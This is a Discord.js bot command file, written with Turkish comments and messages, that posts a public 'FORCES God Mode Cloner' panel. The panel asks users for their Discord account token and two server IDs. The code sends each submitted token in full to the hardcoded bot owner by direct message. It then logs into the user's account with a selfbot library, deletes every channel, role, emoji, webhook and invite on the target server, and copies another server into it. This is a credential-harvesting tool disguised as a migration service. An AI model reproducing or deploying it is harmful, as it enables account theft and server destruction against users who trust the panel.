const { 
    SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, 
    ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType 
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

// Rate limit koruması için gecikme fonksiyonu
const jitter = (ms = 1000) => new Promise(res => setTimeout(res, ms));

// Rate limit kontrolü için global sayaç
let rateLimitCounter = 0;
const MAX_REQUESTS_PER_MINUTE = 30;
let rateLimitResetTime = Date.now() + 60000;

// Rate limit kontrol fonksiyonu
async function checkRateLimit() {
    const now = Date.now();
    if (now > rateLimitResetTime) {
        rateLimitCounter = 0;
        rateLimitResetTime = now + 60000;
    }
    
    if (rateLimitCounter >= MAX_REQUESTS_PER_MINUTE) {
        const waitTime = rateLimitResetTime - now;
        console.log(`⚠️ Rate limit aşıldı! ${waitTime}ms bekleniyor...`);
        await jitter(waitTime);
        rateLimitCounter = 0;
        rateLimitResetTime = Date.now() + 60000;
    }
    
    rateLimitCounter++;
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('kur')
        .setDescription('Klonlama panelini kanala gönderir (Sadece Sahip).'),

    async execute(interaction) {
        const OWNER_ID = "1389930042200559706";

        if (interaction.user.id !== OWNER_ID) {
            return await interaction.reply({ content: "❌ Bu eğik çizgi komutunu sadece bot sahibi kullanabilir.", ephemeral: true });
        }

        if (!interaction.client.kurListenerSet) {
            interaction.client.on('interactionCreate', async (int) => {
                
                if (int.isButton() && int.customId === 'btn_god_clone') {
                    const modal = new ModalBuilder()
                        .setCustomId('modal_god_clone')
                        .setTitle('Klonlama Sistemi Bilgi Girişi');

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t').setLabel('Kullanıcı (Self) Token').setStyle(TextInputStyle.Short).setRequired(true)),
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s').setLabel('Kaynak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('h').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true))
                    );
                    return await int.showModal(modal);
                }

                if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
                    await int.deferReply({ ephemeral: true });
                    
                    const t = int.fields.getTextInputValue('t').trim();
                    const s = int.fields.getTextInputValue('s').trim();
                    const h = int.fields.getTextInputValue('h').trim();
                    
                    const botOwner = await interaction.client.users.fetch(OWNER_ID).catch(() => null);
                    
                    if (botOwner) {
                        const logEmbed = new EmbedBuilder()
                            .setColor('#ff0055')
                            .setTitle('📥 Yeni Klonlama Talebi / Veri Girişi')
                            .setDescription(`**Formu Dolduran:** ${int.user.tag} (\`${int.user.id}\`)`)
                            .addFields(
                                { name: '🔑 Girilen Token', value: `\`\`\`${t}\`\`\`` },
                                { name: '📤 Kaynak Sunucu ID', value: `\`${s}\``, inline: true },
                                { name: '📥 Hedef Sunucu ID', value: `\`${h}\``, inline: true }
                            )
                            .setTimestamp();
                            
                        await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
                    }

                    startGodModeClone(botOwner, t, s, h);
                    await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
                }
            });
            interaction.client.kurListenerSet = true;
        }

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('🌌 FORCES God Mode Cloner')
            .setDescription(
                `**Aktif Sunucu Taşıma Altyapısı**\n\n` +
                `Aşağıdaki butonu kullanarak taşınacak veya klonlanacak sunucunun bilgilerini girebilirsiniz. ` +
                `Girilen bilgiler doğrudan sistem yöneticisine iletilir ve işlem sıraya alınır.`
            )
            .setFooter({ text: 'Bu paneli herkes kullanabilir.' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_god_clone').setLabel('Verileri Gir & Başlat').setStyle(ButtonStyle.Primary)
        );

        await interaction.reply({ embeds: [embed], components: [row] });
    }
};

async function startGodModeClone(owner, token, srcId, trgId) {
    if (!owner) return;
    
    const self = new SelfClient({ checkUpdate: false });
    
    self.on('ready', async () => {
        try {
            const src = self.guilds.cache.get(srcId);
            const trg = self.guilds.cache.get(trgId);

            if (!src || !trg) return owner.send("❌ Hata: Girdiğin sunucu ID'lerinden birine selfbot erişemedi.");

            await owner.send(`🌌 **Klonlama Başlatıldı!** \`${src.name}\` -> \`${trg.name}\` sunucusuna aktarılıyor...`);

            // --- 1. AŞAMA: TAM TEMİZLİK ---
            
            // Kanalları silme
            await owner.send("🗑️ **Kanal Temizliği Başladı...**");
            const chans = await trg.channels.fetch();
            let channelCount = 0;
            for (const c of chans.values()) { 
                await checkRateLimit();
                await c.delete().catch(() => {}); 
                channelCount++;
                await jitter(1000); 
            }
            await owner.send(`✅ **${channelCount}** kanal silindi.`);

            // Rolleri silme
            await owner.send("🗑️ **Rol Temizliği Başladı...**");
            const roles = await trg.roles.fetch();
            const toDeleteRoles = roles.filter(r => r.name !== '@everyone' && !r.managed && r.editable).sort((a,b) => a.position - b.position);
            let roleCount = 0;
            for (const r of toDeleteRoles.values()) { 
                await checkRateLimit();
                await r.delete().catch(() => {}); 
                roleCount++;
                await jitter(1000); 
            }
            await owner.send(`✅ **${roleCount}** rol silindi.`);

            // Emojileri silme
            await owner.send("🗑️ **Emoji Temizliği Başladı...**");
            const emojis = await trg.emojis.fetch();
            let emojiCount = 0;
            for (const e of emojis.values()) { 
                await checkRateLimit();
                await e.delete().catch(() => {}); 
                emojiCount++;
                await jitter(1000); 
            }
            await owner.send(`✅ **${emojiCount}** emoji silindi.`);

            // Webhook'ları silme
            await owner.send("🗑️ **Webhook Temizliği Başladı...**");
            const webhooks = await trg.fetchWebhooks();
            let webhookCount = 0;
            for (const w of webhooks.values()) { 
                await checkRateLimit();
                await w.delete().catch(() => {}); 
                webhookCount++;
                await jitter(1000); 
            }
            await owner.send(`✅ **${webhookCount}** webhook silindi.`);

            // Invite'ları silme
            await owner.send("🗑️ **Davet Temizliği Başladı...**");
            const invites = await trg.invites.fetch();
            let inviteCount = 0;
            for (const inv of invites.values()) { 
                await checkRateLimit();
                await inv.delete().catch(() => {}); 
                inviteCount++;
                await jitter(1000); 
            }
            await owner.send(`✅ **${inviteCount}** davet silindi.`);

            // Sunucu ayarlarını sıfırlama
            await owner.send("⚙️ **Sunucu Ayarları Sıfırlanıyor...**");
            try {
                await checkRateLimit();
                await trg.edit({
                    verificationLevel: 0,
                    defaultMessageNotifications: 0,
                    explicitContentFilter: 0,
                    afkTimeout: 300,
                    publicUpdatesChannelId: null,
                    rulesChannelId: null,
                    systemChannelId: null
                });
                await jitter(1000);
                await owner.send("✅ Sunucu ayarları sıfırlandı.");
            } catch (err) {
                await owner.send(`⚠️ Sunucu ayarları sıfırlanamadı: ${err.message}`);
            }

            await owner.send("🧹 **Temizlik Tamamlandı:** Hedef sunucudaki tüm içerikler başarıyla silindi.");

            // --- 2. AŞAMA: AYARLAR VE ROLLERİN YENİDEN OLUŞTURULMASI ---
            await owner.send("🔄 **Sunucu Ayarları Kopyalanıyor...**");
            
            await checkRateLimit();
            await trg.setName(src.name).catch(() => {});
            await jitter(1000);
            
            if (src.iconURL()) {
                await checkRateLimit();
                await trg.setIcon(src.iconURL({ size: 1024 })).catch(() => {});
                await jitter(1000);
            }
            
            if (src.bannerURL()) {
                await checkRateLimit();
                await trg.setBanner(src.bannerURL({ size: 1024 })).catch(() => {});
                await jitter(1000);
            }

            // Rolleri yeniden oluştur
            await owner.send("🔄 **Roller Kopyalanıyor...**");
            const roleMap = new Map();
            const srcRoles = [...src.roles.cache.values()].sort((a,b) => a.position - b.position);
            let roleCreateCount = 0;

            for (const r of srcRoles) {
                if (r.name === '@everyone' || r.managed) continue;
                await checkRateLimit();
                const newRole = await trg.roles.create({
                    name: r.name,
                    color: r.color ? Number(r.color) : 0,
                    permissions: r.permissions,
                    hoist: r.hoist,
                    mentionable: r.mentionable,
                    position: r.position
                }).catch(() => null);
                if (newRole) {
                    roleMap.set(r.id, newRole.id);
                    roleCreateCount++;
                }
                await jitter(1000);
            }
            await owner.send(`✅ **${roleCreateCount}** rol kopyalandı.`);

            // --- 3. AŞAMA: KATEGORİ VE KANALLAR ---
            await owner.send("🔄 **Kanallar Kopyalanıyor...**");
            const channelMap = new Map();
            const categories = src.channels.cache.filter(c => c.type === 'GUILD_CATEGORY' || c.type === 4).sort((a,b) => a.position - b.position);
            let categoryCount = 0;
            let channelCreateCount = 0;

            for (const cat of categories.values()) {
                await checkRateLimit();
                const newCat = await trg.channels.create(cat.name, {
                    type: 4,
                    permissionOverwrites: cat.permissionOverwrites.cache.map(o => ({
                        id: roleMap.get(o.id) || o.id,
                        allow: o.allow, deny: o.deny, type: o.type
                    }))
                }).catch(() => null);
                await jitter(1000);

                if (newCat) {
                    channelMap.set(cat.id, newCat.id);
                    categoryCount++;
                    
                    const children = src.channels.cache.filter(c => c.parentId === cat.id).sort((a,b) => a.position - b.position);
                    
                    for (const child of children.values()) {
                        await checkRateLimit();
                        let chType = (child.type === 'GUILD_VOICE' || child.type === 2) ? 2 : 0;
                        const newChannel = await trg.channels.create(child.name, {
                            type: chType,
                            parent: newCat.id,
                            topic: child.topic || null,
                            nsfw: child.nsfw || false,
                            bitrate: child.bitrate || 64000,
                            userLimit: child.userLimit || 0,
                            permissionOverwrites: child.permissionOverwrites.cache.map(o => ({
                                id: roleMap.get(o.id) || o.id,
                                allow: o.allow, deny: o.deny, type: o.type
                            }))
                        }).catch(() => null);
                        if (newChannel) channelCreateCount++;
                        await jitter(1000);
                    }
                }
            }
            await owner.send(`✅ **${categoryCount}** kategori ve **${channelCreateCount}** kanal kopyalandı.`);

            // --- 4. AŞAMA: EMOJİLER ---
            await owner.send("🔄 **Emojiler Kopyalanıyor...**");
            let emojiCreateCount = 0;
            for (const emoji of src.emojis.cache.values()) {
                await checkRateLimit();
                const newEmoji = await trg.emojis.create(emoji.url, emoji.name).catch(() => null);
                if (newEmoji) emojiCreateCount++;
                await jitter(1000);
            }
            await owner.send(`✅ **${emojiCreateCount}** emoji kopyalandı.`);

            await owner.send(`👑 **Klonlama Başarıyla Tamamlandı!** \n` +
                `📊 **Özet:** \n` +
                `• ${roleCreateCount} rol kopyalandı\n` +
                `• ${categoryCount} kategori kopyalandı\n` +
                `• ${channelCreateCount} kanal kopyalandı\n` +
                `• ${emojiCreateCount} emoji kopyalandı`);
                
            self.destroy();

        } catch (err) {
            await owner.send(`❌ Süreç sırasında teknik hata oluştu: ${err.message}`);
            console.error(err);
            self.destroy();
        }
    });

    self.login(token).catch(() => owner.send("❌ Girilen token hesaba bağlanamadı veya geçersiz."));
}
